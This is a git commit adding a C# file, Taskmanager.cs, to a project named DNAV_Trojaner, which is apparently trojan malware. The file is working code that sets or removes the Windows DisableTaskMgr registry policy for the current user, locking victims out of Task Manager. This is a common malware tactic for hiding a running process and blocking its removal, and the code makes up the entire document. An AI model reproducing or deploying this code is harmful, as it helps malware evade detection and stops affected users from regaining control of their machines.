a248de7792bf458e351efbdbd845ea19a15fea0c
Sebastian Wittmann <sebastian.wittmann97@web.de>
2019-11-02 18:48:48 +0100

    added function disable taskmananger

---
+++ DNAV_Trojaner/Taskmanager.cs
@@ -0,0 +1,29 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+
+namespace DNAV_Trojaner
+{
+    public static class Taskmanager
+    {
+        public static void Enable()
+        {
+            RegistryKey taskManagerKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+            if(taskManagerKey.GetValue("DisableTaskMgr") != null)
+            {
+                taskManagerKey.DeleteValue("DisableTaskMgr");
+            }
+        }
+
+        public static void Disable()
+        {
+            RegistryKey taskManagerKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+            taskManagerKey.SetValue("DisableTaskMgr", "1");
+            taskManagerKey.Close();
+        }
+    }
+}
